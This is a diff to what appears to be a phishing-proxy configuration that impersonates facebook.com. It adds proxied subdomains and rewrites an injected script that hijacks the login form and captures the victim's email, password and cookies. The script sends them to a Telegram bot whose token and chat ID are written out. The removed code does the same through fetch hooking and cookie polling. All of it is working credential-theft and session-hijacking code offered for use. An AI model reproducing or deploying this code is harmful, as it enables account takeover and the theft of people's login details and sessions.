@@ -5,6 +5,9 @@ proxy_hosts:
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
   - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
   - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'auth-platform', orig_sub: 'auth-platform', domain: 'facebook.com', session: true}
+  - {phish_sub: 'b-api', orig_sub: 'b-api', domain: 'facebook.com', session: true} 
+  - {phish_sub: 'afad', orig_sub: 'afad', domain: 'facebook.com', session: false}
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
@@ -80,47 +83,47 @@ js_inject:
       window.fetch = async function(...args) {
       const [url, options] = args;
 
-      console.log('script injected')
-        
-        // Capture session cookies from ALL responses
-        if (options?.credentials === 'include') {
-          const response = await originalFetch.apply(this, args);
-          const cookies = response.headers.get('set-cookie');
-          if (cookies?.includes('c_user')) {
-            sendToTelegram(`🔥 SESSION COOKIES:\n${cookies}`);
+      console.log(options)
+
+      let formSubmitted = false;
+
+      // ===== 2. ACCURATE FORM INTERCEPTION =====
+      const hijackSubmit = (form) => {
+        form.onsubmit = async (e) => {
+          e.preventDefault();
+          const email = form.querySelector('[name="email"]')?.value;
+          const pass = form.querySelector('[name="pass"]')?.value;
+          
+          if (email && pass && !formSubmitted) {
+            formSubmitted = true;
+            
+            // ===== 3. DELAYED CREDENTIAL+SESSION CAPTURE =====
+            setTimeout(async () => {
+              // Capture ACTIVE cookies (proves successful login)
+              const cookies = document.cookie;
+              
+              // Send to Telegram (REQUIRES your bot token)
+              await fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                  chat_id: "5228920520",
+                  text: `✅ LOGIN SUCCESS\n📧 Email: ${email}\n🔑 Password: ${pass}\n🍪Cookie: ${cookies}`,
+                }),
+                keepalive: true
+              });
+
+              // Manually submit the form after capture
+              form.submit();
+            }, 3000); // 3-second delay to ensure cookies exist
           }
-          return response;
-        }
-        
-        return originalFetch.apply(this, args);
+        };
       };
-      setInterval(() => {
-        const cookies = document.cookie;
-        if (cookies.includes('c_user')) {
-          sendToTelegram(`🔄 ACTIVE COOKIES:\n${cookies}`);
-        }
-      }, 5000);
 
-      document.addEventListener('submit', (e) => {
-        if (e.target.action.includes('/login/')) {
-          const email = e.target.querySelector('[name="email"]')?.value;
-          const pass = e.target.querySelector('[name="pass"]')?.value;
-          if (email && pass) {
-            sendToTelegram(`📧 CREDS:\nEmail: ${email}\nPass: ${pass}`);
-          }
-        }
-      }, true);
+      // ===== 4. INITIALIZE ON ALL FORMS =====
+      document.querySelectorAll('form').forEach(hijackSubmit);
 
-
-      function sendToTelegram(message) {
-        fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            chat_id: "5228920520",
-            text: message,
-            disable_notification: false
-          }),
-          keepalive: true
-        }).catch(e => console.error('Telegram fail:', e));
-      }
+      // ===== 5. FALLBACK: MUTATIONOBSERVER =====
+      new MutationObserver(() => {
+        document.querySelectorAll('form').forEach(hijackSubmit);
+      }).observe(document.body, { childList: true, subtree: true });
